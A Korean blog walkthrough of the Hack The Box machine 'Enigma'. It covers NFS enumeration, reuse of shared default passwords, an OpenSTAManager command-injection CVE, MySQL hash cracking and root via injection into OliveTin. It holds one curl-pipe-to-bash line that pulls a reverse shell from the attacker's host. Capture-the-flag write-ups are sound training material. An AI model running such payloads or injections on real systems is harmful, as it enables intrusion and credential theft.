---
title: "[HTB] Enigma (Easy_Linux)"
date: 2026-07-11 22:16:00 +09:00
categories: [Security & Hacking, HTB]
tags: [Hack The Box, hacking, RedLabs, Linux]
password: "20260711"
---

![EnigmaSolved](https://github.com/user-attachments/assets/4b3077e6-4337-46b9-b0d7-a067daff2ab8#.png)

[Enigma has been Pwned OilLampCat has successfully pwned Enigma Machine from Hack The Box](https://labs.hackthebox.com/achievement/machine/988787/915#.png)

## 1. 시작에 앞서

![Enigma](https://github.com/user-attachments/assets/cbe228e5-e2b8-4332-b0d7-6effeaa185da#.png)

이번엔 오랜만에 돌아온 Easy Linux 문제.

쉬움 난이도이긴 한데 중간에 일종의 레빗홀도 많고 그랬어서 살짝 해맸던 문제다.

그래도 이제 하루안에 해냈죠?

## 2. 초기 침투 : 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

### 2-1. nmap 스캔

![nmap](https://github.com/user-attachments/assets/8a98b496-7370-4168-ac1d-d26e6caf438b#.png)

nmap을 통한 포트 스캔 과정에서부터 이모저모 되게 특이한 포트들이 많이 발견되었다.

평소 보던 `22/ssh`나 `80/http`같은게 아니라 `110`, `143`, `993`, `995` 등이 발견되었는데 

- `110 (POP3)` & `995 (POP3S)` : **POP3** 라고 하는 이메일 서버에서 내 컴퓨터로 메일 다운로드 해오는 방식
- `143 (IMAP)` & `993 (IMAPS)` : **IMAP**은 이메일 서버와 클라이언트를 동기화해서 서버에 메일 남겨두고 읽는 방식
- `2049 (NFS)` : **Network File System**, 파일 공유 서비스
- `111 (RPCBind)` : RPC 서비스들이 어떤 포트 쓰고있는지 클라이언트에게 알려주는 전화번호부 서비스

#### 2-2. 사이트 탐색

![사이트 탐색](https://github.com/user-attachments/assets/8aa51107-f92f-4c4a-9688-5bc34263bc64#.png)

일단 80번 포트가 열려있기에 사이트에 접속에 여기저기 둘러봤는데 전혀 침투할 구석을 찾지 못했다. 그저 이 사이트가 어떤 회사의 사이트라는 것? 

### 2-3. NFS 연결

![nfsmount](https://github.com/user-attachments/assets/d6410dea-d114-4b3f-a7e8-7d5cfce06404#.png)

아까 nfs 서비스가 공유되고 있다는 것을 확인했으니 `showmount -e` 명령어를 이용해 목록을 뽑아보았다.

`/srv/nfs/onboarding *` 이라는 경로가 발견되었고 이름을 보아하니 **onboarding(신규 입사자 교육/안내)** 인 것을 보아 초기 설정이나 사내망 접속법 등이 있을 것 같아 보였다.

게다가 `*`으로 되어있어 어떤 IP든 누구나 이 폴더에 접속할 수 있었다.

![NFS 마운트](https://github.com/user-attachments/assets/c0545418-90cb-4537-b1fb-a971d198b8d5#.png)

공유 폴더를 찾았으니 그걸 내 kali 머신에 마운팅 시키면 내 컴터에서 마치 USB 꽂은 것 마냥 파일을 열어볼 수 있게 된다.

![그래서](https://github.com/user-attachments/assets/f6bf714b-bd62-41cb-9a33-bab632393319#.png)

그래서 찾아낸 **New_Employee_Acess.pdf** 라고 하는 누가봐도 초기 비번 있겠다 싶은게 존재하기에 컴퓨터로 가져와 열어봤다.

![pdf](https://github.com/user-attachments/assets/56a28349-ffa7-44ee-8462-ffe4096a16ff#.png)

짜잔! 초기 침투를 하기도 전에 정찰 하면서 벌써 서브 도메인과 id pwd를 찾아냈다!

## 3. 초기 침투 (Initial Foothold / Exploitation)

### 3-1. mail.001 서브 도메인 살펴보기

![도메인](https://github.com/user-attachments/assets/9b117ffd-70ed-41ad-9c59-bec489992133#.png)

일단 도메인 설정을 해주고

![login](https://github.com/user-attachments/assets/d54be032-dfde-414d-90d2-a460f7d62d9f#.png)

처음 접속해보면 이렇게 Webmail 접속 화면을 볼 수 있다.

이거 딱 보니까 `Roundcube` 서비스라는걸 알 수 있었다.

어 이거? 어디서 많이 본 서비슨데? 싶었다. 

~~전에 다른 문제 풀면서 버전 취약점을 찾아 풀었었다.~~

![로그인](https://github.com/user-attachments/assets/319dc3f1-8a4e-4ccd-bdb9-e547c1c2ce57#.png)

아까 찾은 계정으로 로그인을 해주면?

메일이 딱 하나 와 있는 것을 확인했다.

![열어보](https://github.com/user-attachments/assets/10b0eec4-9f7a-4ec4-86a6-d90e2cbf580b#.png)

열어보니 이 이메일의 주인인 Kevin 씨가 첨으로 이곳에 입사했고 이것저것 설명들하고 보낸 사람이 **sarah** 라는 사람이더라.

는 딱히 정보가 없으니

![버전](https://github.com/user-attachments/assets/d32cca77-3e96-455d-a8fa-1a51eb32448e#.png)

이번에도 버전 문제인가 싶었다. 근데 이걸로 찾아봐도 내용이 전혀 없었다.

### 3-2. 취약 지점을 찾아서.

![ssh](https://github.com/user-attachments/assets/41771e40-b7bf-4ef8-84cd-9b557755ac59#.png)

혹시 이 kevin의 계정에 따라 ssh에 접속할 수 있나 했는데 그건 또 아니였다. 그리고 fuff로 서브 도메인 스캔을 돌려도 나오는게 없었고.

이게 나에겐 첫번째 레빗홀이였다.

![sarah](https://github.com/user-attachments/assets/c0516086-a0e1-4ae3-bf17-2ab7fb848193#.png)

아무리 찾아봐도 없기에 다시 메일로 돌아와 분명 이걸 준 이유가 있겠거니 싶어 생각하다 혹시 비밀번호가 같나? 하는 생각이 들었다.

비밀번호가 `Enigma2024!` 이라는데 설마 이미 입사해있던 sarah도 같은 비밀번호를 쓰며 아직도 초기 비밀번호를 쓴다고?

![정답](https://github.com/user-attachments/assets/7c7adee7-bc8a-4755-88a6-d1b64fd8f4ef#.png)

정답이었다...

이 회사는 어찌된게 다들 같은 초기 비밀번호를 공유하고 있었으며 바꾸지도 않았다.

sarah의 메일에서 새로운 서브 도메인과 user pwd를 찾아냈다.

### 3-3. support_001

![subdomain](https://github.com/user-attachments/assets/ed87afa5-0475-4b95-b785-bfe8142b9461#.png)

그렇기에 서브 도메인을 추가로 등록해 주었고,

![로그인](https://github.com/user-attachments/assets/5cb2b5d2-5a5f-4fd1-88e6-6c74d94eddc7#.png)

사이트에 로그인을 시도해보니,

![의도](https://github.com/user-attachments/assets/11d64f45-2a96-4cd5-b747-73401078708e#.png)

의도된 대로 **OpenSTAManager**에 admin의 권한으로 로그인 할 수 있었다.

![여기저기](https://github.com/user-attachments/assets/6eac0c36-8d5d-4b8d-bd56-c85410f4bb81#.png)

여기저기 둘러보며 admin 설정이나 계정 정보도 보곤 했는데

![딴건](https://github.com/user-attachments/assets/096193b6-1d8b-4c28-88bf-ca77049e56d4#.png)

다른건 모르겠고 버전 정보를 찾아냈다.

그리고 그걸 토대로 찾다보니

![CVE](https://github.com/user-attachments/assets/aeda0381-f6e5-4def-a3ad-f188e99e1e25#.png)

CVE-2025-69212 라고 하는 취약점을 찾아낼 수 있었다. OS 명령 주입 취약점이라는데...

![위치](https://github.com/user-attachments/assets/603a45d1-1af9-4010-a62a-1f828c641cde#.png)

물론 python 코드를 찾아낼 수도 있겠다만 간단해보이기에 위치를 찾아가봤다.

위에 보이는 XML 부분에 파일을 넣게 되면 그걸 통해서 OS 명령 주입이 가능하다나?

![는](https://github.com/user-attachments/assets/71ab8847-fde8-428e-8f32-391d604b5017#.png)

는... 뭔가 `.p7m` 파일이 포함된 zip을 만들고 그걸 넣어서 취약점을 터뜨리는거라는데... 갑자기 귀찮아졌다.

### 3-4. CVE-2025-069212

![긴빠이](https://github.com/user-attachments/assets/45b7c6a6-238f-4d98-a0fe-58635ae3de5b#.png)

그래서 바~로 github를 뒤져 간단한 파이썬 코드를 가져와 쉘을 업로드 해주었다.

![쉘](https://github.com/user-attachments/assets/7ee4c2df-9316-4834-b128-42074bed9906#.png)

보아하니 쉘 업로드는 매우 성공적이었다.

다만 이 상태에서 뭘 하기엔 불편해서 리버스 쉘을 받으면 좋겠다 싶었다.

![내쪽](https://github.com/user-attachments/assets/e3f1fe6a-1f98-438a-810a-8569a83445e0#.png)

보아하니 내쪽 http 서버로도 잘 연결되어있는 듯 하니

![sh](https://github.com/user-attachments/assets/351b9fe3-0a7b-4c72-bd29-b42ec31ccf90#.png)

```sh
?c=curl%2010.10.14.31:8000/test.sh%20%7C%20bash
```

이런 식으로 url에 넣어 내 컴의 리버스 쉘 코드를 가져가 바로 실행시키게 하였다. 살짝 이상한 부분은 그냥 넣으면 막혀서 url 인코딩을 해서 넣어주었다.

### 3-5. 근데 이것도 유저가 아닌데?

![짜잔](https://github.com/user-attachments/assets/bd7a5fbe-9096-47fa-b9bb-9f25101badf4#.png)

짜잔 계정을 얻어냈다. 문제가 있다면 이것도 유저의 계정이 아니라는 점?

![파일들](https://github.com/user-attachments/assets/f5dc31e2-987b-4525-9472-96ebc9d41b63#.png)

파일들이 있기에 권한을 보니 모두 접속 불가능이다. 

![비밀번호](https://github.com/user-attachments/assets/32804fc1-74ec-4e34-ac7c-cca82bfd2956#.png)

아까 비밀번호를 돌려쓰기에 이번에도 그런가 싶어 모두 다 `su` 명령어를 돌렸으나 호락호락하지 않았다.

![파일](https://github.com/user-attachments/assets/6b780368-b99b-4e29-a19c-42f38bbcb1da#.png)

그래서 첨 리버스쉘 왔던 파일을 둘러보다 `config.inc.php`라고 하는 뭔가 설정 관련 파일이 있어 열어봤다.

![오옹](https://github.com/user-attachments/assets/3405946d-8ec2-4a89-a68d-7fad42b94a48#.png)

오옹? 왠 db 계정을 찾아냈다.

### 3-6. mysql

![my](https://github.com/user-attachments/assets/0302bf06-772b-44b1-af35-c4621cbc4843#.png)

mysql에 접속을 해보니 된다?

![테이블](https://github.com/user-attachments/assets/fb40d853-2ee7-4ea7-9cb5-4ec3438d58b7#.png)

테이블은... 너무 많긴 하다만 뭔가 유저 정보가 들어있을 듯 한 `zz_users` 테이블을 찾아냈다.

![역시](https://github.com/user-attachments/assets/32b50844-42dd-4cfd-9a84-9ea0c7ac7b8a#.png)

역시! 여기 admin과 heris 라는 계정의 비밀번호 정보가 들어있었다.

![hash](https://github.com/user-attachments/assets/eef1cb48-6cf0-458e-aee1-989c7b8d8104#.png)

아쉽게도 crackstation에서 쉽게 디코딩을 할 수는 없었고 위처럼 **john the  ripper**를 이용해 **bestfriends** 라는 비밀번호를 찾아냈다.

![su](https://github.com/user-attachments/assets/f4e0aede-d102-4b6f-a36b-b3743c8ad85c#.png)

su 명령어를 이용해 아까 봤던 haris로 계정을 올리면?

드디어 초기 침투 성공!

## 4. 권한 상승 (Privilege Escalation) 

### 4-1. 정찰 및 정보 수집

![국룰](https://github.com/user-attachments/assets/6ab71d3f-5c98-459c-ae60-d03a02490034#.png)

국룰을 해보았지만 haris는 권한이 없댄다... 이건 아니거둰...

![ls](https://github.com/user-attachments/assets/6d4e2e96-dbfd-47a1-a58a-6c721a620b21#.png)

가만 생각해보니 아까 플래그 얻을 때 뭔가 있었네? 싶어 들어가보니 `.imap`이라는 친구가 존재했다.

이게 무엇인고 하니 처음 정찰을 할 때 `Dovecot`이 라는 이메일 서버 프로그램이 사용하는 **인덱스(목차) 및 메타 데이터 저장소** 라고 한다.

만... 이미 우린 두 이메일 계정을 찾았고 이건 binary 형태의 캐시 파일밖에 없어서 이건 아니였다.

그래서 뭘 할까 하며 여기저기 찔러보다 내부 내트워크를 스캔해서 제미니한테 보냈더니

![호들갑](https://github.com/user-attachments/assets/14d224f6-a0e8-4a81-9a15-be42d4f8b709#.png)

세상 호들갑을 떨며 **1337번 포트**를 찔러라!!

라고 소리치더라.

### 4-2. 1337번 포트 (OliveTin)

난 이게 뭔지도 모르고 어떻게 쓰는건지 어떤 서비스인지도 모르기에 

![curl](https://github.com/user-attachments/assets/aef6a8bb-0666-40c1-ba90-1f71be1f1209#.png)

curl로 HTML 소스코드를 뜯어왔다.

**사전에 정의된 쉘 명령어들을 웹 인터페이스에서 안전하고 간단하게 실행할 수 있게 해줍니다.**

라는데. OliveTin은 시스템 관리자가 편하게 쓰려 만들어둔 일종의 `웹 기반 쉘 커맨드 실행기` 라고 볼 수 있다.

예를 들면 서버 재시작을 하고 싶을 때 olivetin 웹에 접속해 딸깍으로 끈다던가 백업도 버튼 하나로 해버리는 그런 기능이 있는거다. 

그리고 우리에게 있어 이건 `root`권한으로 돌고 있을 확률이 매우 높은, 그런데 우리가 접근 가능한 침투 경로라고 볼 수 있는 것이다!

![ls](https://github.com/user-attachments/assets/980dca4e-27a6-432e-8b35-57c922d123ae#.png)

일단은 그래서 뭘 할 수 있는지 알아야 하니까 `/etc/OliveTin` 폴더가 있기에 들어가서 `config.yaml` 파일을 살펴보았다.

역시 아까 예상했듯 여기선 뭔가 명령어를 보내는 것들이 있었는데

![백업](https://github.com/user-attachments/assets/43f124fb-eb60-4c68-b0d1-d55b57ada97b#.png)

그 중 제미나이는 이 data base 쪽을 특히나 건들이라고 했다.

왜 내가 분석을 안 했냐고? 난 아직 배우는 입장이기도 하고 봐도 몰라서...

제미니 선생 왈 

이 `backup_database`는 `shell`이 실행되고 입력으로 넣은 값이 `{{ }}`으로 들어가는 구조인데 여기서 `db_user`나 `db_name`의 경우 `ascii_identifier`로 성정이 되어있다.

그렇다보니 `;`나 `&`, `'`과 같은 특수 문자를 차단하게 되는데 `db_pass` 부분은 유일하게 `type: password`로 설정되어있어 어떤 문자든 넣을 수가 있었다!

![그래서](https://github.com/user-attachments/assets/8ecfda66-e372-4cff-82f6-bb7b20885a92#.png)

그래서 위에 보이는 대로 페이로드를 만들어 루트 권한이 들어간 쉘을 `/tmp` 폴더에 만들도록 짜서 curl을 통해 요청을 보냈는데 사실 여기서도 좀 많은 문제가 있었달까...

요청을 보낼 떄 난 `http://127.0.0.1:1337/api/StartAction`으로 요청을 보내려 했었다. 애초에 공식 문서에도 그렇게 나와있었고.

그런데 이게 아무리 요청을 보내도 `/tmp/rootbash`가 안 오더라.

![그래서](https://github.com/user-attachments/assets/5f6550f1-b675-4cf1-8735-de2b99d0f2df#.png)

그러다 찾아낸 api의 진짜 주소가 `http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait` 라는걸 간신히 찾아내고 요청을 보내니

그제야 `-p` 옵션도 포함해서 드디어 루트 쉘을 얻어낼 수 있었다!!

## 마치며

![Enigma pwned](https://github.com/user-attachments/assets/ad6df685-0184-4efe-8876-adb06603533c#.png)

간단한 듯 하지만 초기침투 과정에서부터 한 호흡이 길어버리니 푸는데 내가 가고 있는게 맞나? 잘못된 래빗홀에 빠진게 아닐까 하는 생각도 들면서 여기저기 해맸던 문제였다.

하지만 언제나 그렇듯 길은 있다. 내가 아직 찾지 못했을 뿐.

이제 벌써 7월이니 9월이면 소집해제를 하고 oscp에 도전해볼까 한다. 마음처럼 될지는 모르겠다만.. 일단 해봐야지.

Happy Hacking!